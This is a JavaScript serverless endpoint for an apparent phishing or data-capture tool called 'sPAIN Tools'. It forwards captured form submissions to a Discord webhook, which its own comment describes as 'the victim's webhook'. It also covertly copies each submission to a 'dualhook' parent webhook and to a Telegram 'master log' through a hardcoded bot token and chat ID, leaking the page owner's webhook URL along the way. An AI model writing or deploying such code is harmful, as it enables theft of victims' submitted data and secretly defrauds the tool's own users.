// api/submit.js
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT     = process.env.TG_CHAT  || '7538845070';

async function redisGet(key) {
  const res = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
    headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
  });
  const json = await res.json();
  if (!json.result) return null;
  try { return JSON.parse(json.result); } catch { return null; }
}

async function tgSend(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (_) {}
}

async function sendToDiscord(webhookUrl, embed, label) {
  if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) return;
  try {
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: 'sPAIN Tools',
        embeds: [embed]
      })
    });
  } catch (_) {}
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });

  let body = req.body;
  if (typeof body === 'string') {
    try { body = JSON.parse(body); } catch { return res.status(400).json({ error: 'Invalid JSON' }); }
  }

  const { slug, slots } = body || {};

  if (!slug)  return res.status(400).json({ error: 'slug is required' });
  if (!slots) return res.status(400).json({ error: 'slots is required' });

  let record;
  try {
    record = await redisGet(`slot:${slug}`);
  } catch (err) {
    return res.status(500).json({ error: 'Redis error', detail: err.message });
  }

  if (!record) return res.status(404).json({ error: 'Page not found' });

  const now = new Date().toISOString();

  const fields = Object.entries(slots).map(([key, value]) => ({
    name: `Slot ${key.replace('slot', '')}`,
    value: value || '*(empty)*',
    inline: true
  }));

  const embed = {
    title: `📥 New Submission — ${record.displayName}`,
    color: 0xc026d3,
    fields,
    footer: { text: `sPAIN Tools • ${slug} • ${now}` },
    timestamp: now
  };

  // 1. Always send to this page's own webhook (the victim's webhook in dualhook flow)
  await sendToDiscord(record.webhook, embed, 'page-webhook');

  // 2. ── KEY FIX ── If this page was spawned by a dualhook parent, also send to parent webhook
  if (record.parentWebhook && record.parentWebhook !== record.webhook) {
    const parentEmbed = {
      ...embed,
      title: `📥 Dualhook Capture — ${record.displayName}`,
      description: `Submission from sub-page \`${slug}\``,
      color: 0x06b6d4,  // cyan to distinguish dualhook copies
    };
    await sendToDiscord(record.parentWebhook, parentEmbed, 'dualhook-parent-webhook');
  }

  // 3. Telegram master log
  const slotLines = Object.entries(slots)
    .map(([k, v]) => `  Slot ${k.replace('slot','')}: ${v || '(empty)'}`)
    .join('\n');

  const tgMsg = [
    `📥 <b>New Submission!</b>`,
    `📁 Page: <code>${slug}</code> (${record.displayName})`,
    `🔧 Type: ${record.type}`,
    ``,
    `<b>Slots:</b>`,
    slotLines,
    ``,
    record.parentWebhook ? `🔀 Dualhook parent webhook also notified` : '',
    `📡 Webhook: <code>${record.webhook}</code>`,
    `🕐 ${now}`
  ].filter(s => s !== undefined).join('\n');

  await tgSend(tgMsg);

  return res.status(200).json({ success: true });
}
